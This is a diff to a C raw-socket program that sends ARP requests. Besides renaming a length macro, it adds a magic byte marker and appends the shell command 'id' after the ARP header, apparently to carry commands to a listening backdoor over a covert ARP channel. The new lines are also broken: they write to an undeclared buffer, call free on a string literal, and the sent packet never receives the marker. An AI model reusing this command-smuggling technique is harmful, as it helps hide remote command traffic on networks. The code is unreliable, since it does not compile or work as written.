@@ -11,11 +11,12 @@
 #include <netpacket/packet.h>
 #include <net/ethernet.h>
 
-#define MAC_LEN 6
+#define ETH_ALEN 6
 #define IP_LEN 4
 #define ETH_TYPE_ARP 0x0806
 #define ARP_REQUEST_OPCODE 0x0001
 #define DEFAULT_PACKET_LEN 42
+#define FLAG "\x70\x95\x05"
 
 // Function to retrieve the MAC address of an interface
 int get_mac_address(const char *iface, unsigned char *mac) {
@@ -32,7 +33,7 @@ int get_mac_address(const char *iface, unsigned char *mac) {
         return -1;
     }
     close(fd);
-    memcpy(mac, ifr.ifr_hwaddr.sa_data, MAC_LEN);
+    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
     return 0;
 }
 
@@ -60,7 +61,7 @@ void send_arp_request(const char *iface, const char *target_ip_str) {
     int sockfd;
     unsigned char packet[DEFAULT_PACKET_LEN + 10];
     struct sockaddr_ll sa;
-    unsigned char my_mac[MAC_LEN], target_mac[MAC_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    unsigned char my_mac[ETH_ALEN], target_mac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
     struct in_addr my_ip, target_ip;
 
     // Create raw socket
@@ -78,8 +79,8 @@ void send_arp_request(const char *iface, const char *target_ip_str) {
     inet_aton(target_ip_str, &target_ip);
 
     // Fill Ethernet header
-    memcpy(packet, target_mac, MAC_LEN);              // Destination MAC
-    memcpy(packet + MAC_LEN, my_mac, MAC_LEN);        // Source MAC
+    memcpy(packet, target_mac, ETH_ALEN);              // Destination MAC
+    memcpy(packet + ETH_ALEN, my_mac, ETH_ALEN);        // Source MAC
     packet[12] = ETH_TYPE_ARP >> 8;
     packet[13] = ETH_TYPE_ARP & 0xff;
 
@@ -89,27 +90,30 @@ void send_arp_request(const char *iface, const char *target_ip_str) {
     arp_header[1] = 0x01;
     arp_header[2] = 0x08;                             // Protocol type (IP)
     arp_header[3] = 0x00;
-    arp_header[4] = MAC_LEN;                          // Hardware size
+    arp_header[4] = ETH_ALEN;                          // Hardware size
     arp_header[5] = IP_LEN;                           // Protocol size
     arp_header[6] = ARP_REQUEST_OPCODE >> 8;          // Opcode (ARP Request)
     arp_header[7] = ARP_REQUEST_OPCODE & 0xff;
 
     // ARP Payload
-    memcpy(arp_header + 8, my_mac, MAC_LEN);          // Sender MAC address
+    memcpy(arp_header + 8, my_mac, ETH_ALEN);          // Sender MAC address
     memcpy(arp_header + 14, &my_ip, IP_LEN);          // Sender IP address
-    memcpy(arp_header + 18, target_mac, MAC_LEN);     // Target MAC address (unknown)
+    memcpy(arp_header + 18, target_mac, ETH_ALEN);     // Target MAC address (unknown)
     memcpy(arp_header + 24, &target_ip, IP_LEN);      // Target IP address
 
     // Append custom payload
     const char *payload = "id";
-    size_t packet_len = sizeof(struct ethhdr) + 28 + strlen(payload);
-    memcpy(packet + sizeof(struct ethhdr) + 28, payload, strlen(payload));
+    size_t size = ETH_HLEN + 28 + strlen(payload) + strlen(FLAG);
+    memcpy(buffer + ETH_HLEN + 28, FLAG, strlen(FLAG));
+    memcpy(buffer + ETH_HLEN + 28 + strlen(FLAG), payload, strlen(payload));
+    free(payload);
+    size_t packet_len = ETH_HLEN + 28 + strlen(payload) + strlen(FLAG);
 
     // Set up socket address structure
     memset(&sa, 0, sizeof(sa));
     sa.sll_ifindex = if_nametoindex(iface);
-    sa.sll_halen = MAC_LEN;
-    memcpy(sa.sll_addr, target_mac, MAC_LEN);
+    sa.sll_halen = ETH_ALEN;
+    memcpy(sa.sll_addr, target_mac, ETH_ALEN);
 
     // Send the packet
     if (sendto(sockfd, packet, packet_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
